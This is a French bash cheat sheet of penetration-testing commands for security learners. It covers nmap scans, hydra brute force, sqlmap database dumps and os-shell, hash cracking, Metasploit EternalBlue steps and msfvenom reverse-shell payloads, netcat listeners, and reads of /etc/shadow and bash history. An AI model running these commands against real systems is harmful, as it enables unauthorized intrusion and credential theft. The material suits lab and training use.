#!/bin/bash
# ═══════════════════════════════════════════════════════
#   COMMANDES ESSENTIELLES — Ingénieur Cybersécurité
#   Référence rapide pour le terminal Linux
# ═══════════════════════════════════════════════════════

# ─────────────────────────────────────────────────
# NMAP — Le scanner de référence
# ─────────────────────────────────────────────────
# Scan basique
nmap -sV 192.168.1.1

# Scan complet (tous les ports, scripts, OS detection)
nmap -sV -sC -O -p- --open -T4 192.168.1.1 -oN scan_complet.txt

# Scan UDP (lent mais important: DNS, SNMP, TFTP...)
nmap -sU --top-ports 100 192.168.1.1

# Scan de tout un réseau
nmap -sn 192.168.1.0/24                          # Ping sweep
nmap -sV --open 192.168.1.0/24                   # Services sur réseau

# Scan furtif (SYN, pas de connexion complète)
nmap -sS 192.168.1.1

# Scripts NSE (vulnérabilités connues)
nmap --script vuln 192.168.1.1                   # Scan de vulnérabilités
nmap --script smb-vuln* 192.168.1.1              # Vulnérabilités SMB
nmap --script http-enum 192.168.1.1              # Enum web


# ─────────────────────────────────────────────────
# NETCAT — Le couteau suisse du réseau
# ─────────────────────────────────────────────────
nc -lvnp 4444                                     # Écoute (listener)
nc 192.168.1.100 4444                             # Connexion
nc -z -v 192.168.1.1 20-1000                     # Scan de ports basique
echo "" | nc -w1 192.168.1.1 80                  # Vérifier si port ouvert
nc -lvnp 8080 < fichier.txt                       # Transférer un fichier


# ─────────────────────────────────────────────────
# HYDRA — Brute force d'authentification
# ─────────────────────────────────────────────────
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1
hydra -L users.txt -P passwords.txt ftp://192.168.1.1
hydra -l admin -P rockyou.txt 192.168.1.1 http-post-form \
    "/login:user=^USER^&pass=^PASS^:Invalid credentials"


# ─────────────────────────────────────────────────
# GOBUSTER/DIRB — Fuzzing de répertoires web
# ─────────────────────────────────────────────────
gobuster dir -u http://192.168.1.1 -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://192.168.1.1 -w common.txt -x php,html,txt,bak
gobuster dns -d domaine.com -w subdomains.txt     # Sous-domaines
dirb http://192.168.1.1 /usr/share/wordlists/dirb/common.txt


# ─────────────────────────────────────────────────
# SQLMAP — Exploitation SQLi automatique
# ─────────────────────────────────────────────────
sqlmap -u "http://site.com/page?id=1" --dbs       # Lister les bases
sqlmap -u "http://site.com/page?id=1" -D mydb --tables
sqlmap -u "http://site.com/page?id=1" -D mydb -T users --dump
sqlmap -u "http://site.com/page?id=1" --os-shell   # Shell si possible
sqlmap -r request.txt --level=5 --risk=3           # Depuis fichier Burp


# ─────────────────────────────────────────────────
# JOHN THE RIPPER & HASHCAT — Crack de hashs
# ─────────────────────────────────────────────────
# John
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john hash.txt --format=md5
john hash.txt --show

# Hashcat (GPU, beaucoup plus rapide)
hashcat -m 0 hash.txt rockyou.txt                 # MD5
hashcat -m 100 hash.txt rockyou.txt               # SHA1
hashcat -m 1800 hash.txt rockyou.txt              # SHA512crypt ($6$)
hashcat -m 3200 hash.txt rockyou.txt              # bcrypt
hashcat -m 0 hash.txt rockyou.txt -r rules/best64.rule  # Avec règles
hashcat -m 0 hash.txt -a 3 ?a?a?a?a?a?a          # Brute force 6 chars


# ─────────────────────────────────────────────────
# METASPLOIT — Framework d'exploitation
# ─────────────────────────────────────────────────
msfconsole                                         # Lancer Metasploit

# Dans msfconsole:
# search eternalblue
# use exploit/windows/smb/ms17_010_eternalblue
# set RHOSTS 192.168.1.1
# set PAYLOAD windows/x64/meterpreter/reverse_tcp
# set LHOST 192.168.1.100
# set LPORT 4444
# run

# Générer un payload:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php


# ─────────────────────────────────────────────────
# OPENSSL — Cryptographie en ligne de commande
# ─────────────────────────────────────────────────
# Générer une clé RSA
openssl genrsa -out cle_privee.pem 4096
openssl rsa -in cle_privee.pem -pubout -out cle_publique.pem

# Générer un certificat auto-signé
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# Chiffrer/déchiffrer un fichier
openssl enc -aes-256-cbc -salt -in fichier.txt -out fichier.enc -k "motdepasse"
openssl enc -aes-256-cbc -d -in fichier.enc -out fichier_dechiffre.txt -k "motdepasse"

# Hasher un fichier
openssl dgst -sha256 fichier.txt
openssl dgst -md5 fichier.txt

# Tester SSL/TLS d'un serveur
openssl s_client -connect domaine.com:443
echo | openssl s_client -connect domaine.com:443 2>/dev/null | openssl x509 -text


# ─────────────────────────────────────────────────
# WIRESHARK/TCPDUMP — Analyse réseau
# ─────────────────────────────────────────────────
# Capturer le trafic
tcpdump -i eth0 -w capture.pcap
tcpdump -i eth0 host 192.168.1.1                  # Filtrer par IP
tcpdump -i eth0 port 80 or port 443               # Filtrer par port
tcpdump -i eth0 -A -s 0 port 80                   # Afficher le contenu HTTP

# Lire un fichier pcap
tcpdump -r capture.pcap
tcpdump -r capture.pcap | grep "GET\|POST\|Host:"

# Filtres Wireshark utiles:
# http.request.method == "POST"
# tcp.port == 4444
# ip.src == 192.168.1.100
# dns.qry.name contains "evil"
# tcp.flags.syn == 1 && tcp.flags.ack == 0  (SYN scan)


# ─────────────────────────────────────────────────
# COMMANDES LINUX — Reconnaissance locale
# ─────────────────────────────────────────────────
# Informations système
uname -a                                           # Version kernel
cat /etc/os-release                                # Version OS
hostname                                           # Nom d'hôte
id && whoami                                       # Utilisateur actuel
sudo -l                                            # Permissions sudo

# Réseau
ip a                                               # Interfaces réseau
ip r                                               # Table de routage
ss -tlnp                                           # Ports en écoute
netstat -tlnp                                      # Alternative
arp -a                                             # Table ARP (hôtes proches)

# Utilisateurs et comptes
cat /etc/passwd                                    # Tous les comptes
cat /etc/shadow                                    # Hashs (root requis)
cat /etc/group                                     # Groupes
last                                               # Dernières connexions
who                                                # Connectés actuellement
w                                                  # Connectés + activité

# Fichiers et permissions
find / -perm -4000 2>/dev/null                    # Fichiers SUID
find / -writable -type f 2>/dev/null              # Fichiers modifiables
find / -name "*.conf" 2>/dev/null | head -20      # Fichiers config
grep -ri "password" /etc/ 2>/dev/null             # Mots de passe en clair

# Processus
ps aux                                             # Tous les processus
ps auxf                                            # Arbre des processus
top                                                # Processus en temps réel

# Historique
cat ~/.bash_history                                # Historique bash
cat ~/.zsh_history                                 # Historique zsh


# ─────────────────────────────────────────────────
# OUTILS DE RECONNAISSANCE PASSIVE (OSINT)
# ─────────────────────────────────────────────────
# Whois
whois domaine.com

# DNS
dig domaine.com ANY                                # Tous les enregistrements
dig domaine.com MX                                 # Serveurs mail
dig @8.8.8.8 domaine.com                          # Via Google DNS
nslookup domaine.com
host -a domaine.com

# Theharvestor (emails, sous-domaines)
theHarvester -d domaine.com -b google,linkedin,bing

# Shodan (dispositifs connectés)
# shodan search "apache 2.4.7"
# shodan host 8.8.8.8

# Sublist3r (sous-domaines)
sublist3r -d domaine.com

# Transfert de zone DNS (si mal configuré)
dig axfr domaine.com @ns1.domaine.com


# ─────────────────────────────────────────────────
# OUTILS SPÉCIALISÉS
# ─────────────────────────────────────────────────
# Nikto — Scanner web
nikto -h http://192.168.1.1
nikto -h https://192.168.1.1 -ssl

# Enum4linux — Enumération SMB/Samba
enum4linux -a 192.168.1.1

# SMBclient — Accès partages Windows
smbclient -L 192.168.1.1                          # Lister les partages
smbclient //192.168.1.1/share -U admin            # Connexion

# Exiftool — Métadonnées
exiftool photo.jpg
exiftool -all= photo.jpg                           # Supprimer les métadonnées

# Binwalk — Analyse binaire/firmware
binwalk firmware.bin
binwalk -e firmware.bin                            # Extraire le contenu

# Strings — Extraire chaînes d'un binaire
strings binaire | grep -i "pass\|key\|secret\|token"

# Ltrace/Strace — Traçage d'appels système
strace -p PID
ltrace ./programme

echo ""
echo "═══════════════════════════════════════════════"
echo "  Ressources d'apprentissage:"
echo "  - TryHackMe.com    (débutant → avancé)"
echo "  - HackTheBox.com   (intermédiaire → expert)"
echo "  - PortSwigger Web Security Academy (web)"
echo "  - CTFtime.org      (compétitions CTF)"
echo "  - OWASP.org        (sécurité web)"
echo "  - MITRE ATT&CK     (framework attaquants)"
echo "═══════════════════════════════════════════════"
